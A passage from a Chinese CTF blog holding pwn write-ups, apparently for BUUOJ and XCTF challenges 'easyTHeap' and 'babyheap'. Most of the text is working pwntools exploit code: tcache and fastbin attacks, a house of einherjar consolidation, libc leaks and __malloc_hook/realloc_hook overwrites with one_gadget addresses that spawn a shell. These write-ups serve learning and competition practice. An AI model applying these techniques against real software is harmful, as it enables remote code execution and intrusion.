&#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;vn_pwn_easyTHeap&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">28200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 0</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 1</span></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak heap addr</span></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	heap_base = u64(ru(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x260</span></span><br><span class="line">	li(<span class="string">&#x27;heap_base &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#ixx 2</span></span><br><span class="line">	md(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>)) <span class="comment">#modify as heap base</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 3</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 4</span></span><br><span class="line">	p = p64(<span class="number">0x0</span>)</span><br><span class="line">	p +=p64(<span class="number">0x0700000000000000</span>) <span class="comment"># set as max num so free not as tcache bin</span></span><br><span class="line">	md(<span class="number">4</span>, p)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#leak libc</span></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">	li(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">	gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xef863</span>, <span class="number">0x10a38c</span>, <span class="number">0x10a398</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line">	p = p64(<span class="number">0x0</span>)</span><br><span class="line">	p +=p64(<span class="number">0x0700000000000000</span>) <span class="comment"># set as max num so free not as tcache bin</span></span><br><span class="line">	p = p.ljust(<span class="number">0xB8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	md(<span class="number">4</span>, p)</span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 5</span></span><br><span class="line">	p = p64(one_gadget)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">8</span>)</span><br><span class="line">	md(<span class="number">5</span>, p)</span><br><span class="line">	<span class="comment">#get shell</span></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	ad(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">## can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r14] == NULL || r14 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/22/wp-vn-easy-theap/" data-id="ckhemv84u005twdcm98chgc2m" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-babyheap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/14/wp-babyheap/" class="article-date">
  <time datetime="2020-04-14T03:33:42.000Z" itemprop="datePublished">2020-04-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/14/wp-babyheap/">wp babyheap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>6 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有4个功能, 添加,删除,查看,退出.保护全开,只有一个漏洞可以利用.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_input</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Read error!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;                       <span class="comment">// off by null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>off by null 漏洞,还有一个是在free时,unsigned int与signed int的索引值,但利用不了…</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>house of einherjar, off by one, unlink check, fastbin attack, realloc_hook to banance stack, one_gadget</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>通过house of einherjar实现堆合并,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;timu&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">libFile  = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def q():</span></span><br><span class="line"><span class="comment">#	sla(&#x27;:&#x27;, str(5))</span></span><br></pre></td></tr></table></figure>



<h3 id="构造堆快布局"><a href="#构造堆快布局" class="headerlink" title="构造堆快布局"></a>构造堆快布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># idx 0 为了合并</span></span><br><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># idx 1 为了在合并后,然后分割堆快打印出main_arena</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># idx 2 为了可以利用fastbin attack 和 off by null</span></span><br><span class="line">ad(<span class="number">0xF0</span>, <span class="string">&#x27;E\n&#x27;</span>) <span class="comment"># idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;F\n&#x27;</span>) <span class="comment">#为了防止top chunk 向前合并</span></span><br></pre></td></tr></table></figure>

<h3 id="使用house-of-einherjar-来合并-chunk-1"><a href="#使用house-of-einherjar-来合并-chunk-1" class="headerlink" title="使用house of einherjar 来合并 chunk 1"></a>使用house of einherjar 来合并 chunk 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="number">2</span>) <span class="comment">#为了使用 off by null 覆盖 chunk3 释放重新开辟</span></span><br><span class="line"><span class="comment"># use house of einherjar</span></span><br><span class="line">p = <span class="string">&#x27;C&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">p += p64(<span class="number">0x190</span>) <span class="comment">#prev_size = chunk 0 addr - chunk 3 addr</span></span><br><span class="line">ad(<span class="number">0x68</span>, p) <span class="comment">#使用 off by null 覆盖 chunk 3</span></span><br><span class="line"></span><br><span class="line">rm(<span class="number">2</span>) <span class="comment">#先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方</span></span><br><span class="line"><span class="comment"># 触发 house of eiherjar</span></span><br><span class="line">   <span class="comment">#避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK-&gt;fd != p</span></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">3</span>)  <span class="comment">#合并到chunk 0</span></span><br></pre></td></tr></table></figure>

<h3 id="泄漏-main-arena-和libc基址"><a href="#泄漏-main-arena-和libc基址" class="headerlink" title="泄漏 main_arena 和libc基址"></a>泄漏 main_arena 和libc基址</h3><p>通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak main_arena</span></span><br><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">16</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#分割 unsorted bin, main_arena 会出现在 chunk 1中</span></span><br><span class="line">dp()</span><br><span class="line">main_arena = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">li(<span class="string">&#x27;main_arena &#x27;</span> + <span class="built_in">hex</span>(main_arena))</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> +  <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<h3 id="fastbin-attack打入-malloc-hook处"><a href="#fastbin-attack打入-malloc-hook处" class="headerlink" title="fastbin attack打入 malloc_hook处"></a>fastbin attack打入 malloc_hook处</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处</span></span><br><span class="line">   p = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x71</span>)</span><br><span class="line">p += p64(main_arena - <span class="number">0x33</span>)</span><br><span class="line">p += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">ad(<span class="number">0xA0</span>, p)</span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#for ajust fastbin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="修改malloc-hook"><a href="#修改malloc-hook" class="headerlink" title="修改malloc_hook"></a>修改malloc_hook</h3><p>由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget</p>
<h4 id="realloc-hook反汇编"><a href="#realloc-hook反汇编" class="headerlink" title="realloc_hook反汇编"></a>realloc_hook反汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass 0x7fe7cb0ea6c0</span><br><span class="line">Dump of assembler code for function __GI___libc_realloc:</span><br><span class="line">   0x00007fe7cb0ea6c0 &lt;+0&gt;:	push   r15</span><br><span class="line">   0x00007fe7cb0ea6c2 &lt;+2&gt;:	push   r14</span><br><span class="line">   0x00007fe7cb0ea6c4 &lt;+4&gt;:	push   r13</span><br><span class="line">   0x00007fe7cb0ea6c6 &lt;+6&gt;:	push   r12</span><br><span class="line">   0x00007fe7cb0ea6c8 &lt;+8&gt;:	mov    r13,rsi</span><br><span class="line">   0x00007fe7cb0ea6cb &lt;+11&gt;:	push   rbp</span><br><span class="line">   0x00007fe7cb0ea6cc &lt;+12&gt;:	push   rbx</span><br><span class="line">   0x00007fe7cb0ea6cd &lt;+13&gt;:	mov    rbx,rdi</span><br><span class="line">   0x00007fe7cb0ea6d0 &lt;+16&gt;:	sub    rsp,0x38</span><br><span class="line">   0x00007fe7cb0ea6d4 &lt;+20&gt;:	mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0</span><br><span class="line">   0x00007fe7cb0ea6db &lt;+27&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007fe7cb0ea6de &lt;+30&gt;:	test   rax,rax</span><br><span class="line">   0x00007fe7cb0ea6e1 &lt;+33&gt;:	jne    0x7fe7cb0ea8e8 &lt;__GI___libc_realloc+552&gt;</span><br><span class="line">   0x00007fe7cb0ea6e7 &lt;+39&gt;:	test   rsi,rsi</span><br><span class="line">   0x00007fe7cb0ea6ea &lt;+42&gt;:	jne    0x7fe7cb0ea6f5 &lt;__GI___libc_realloc+53&gt;</span><br><span class="line">   0x00007fe7cb0ea6ec &lt;+44&gt;:	test   rdi,rdi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过调试试出了两个one_gadget满足execve 第二个参数内容为0</p>
<ol>
<li>malloc_hook = libc_base + 0x4526a, realloc_hook = realloc_addr + 2</li>
<li>malloc_hook = libc_base + 0xf1147, realloc_hook = realloc_addr + 20</li>
</ol>
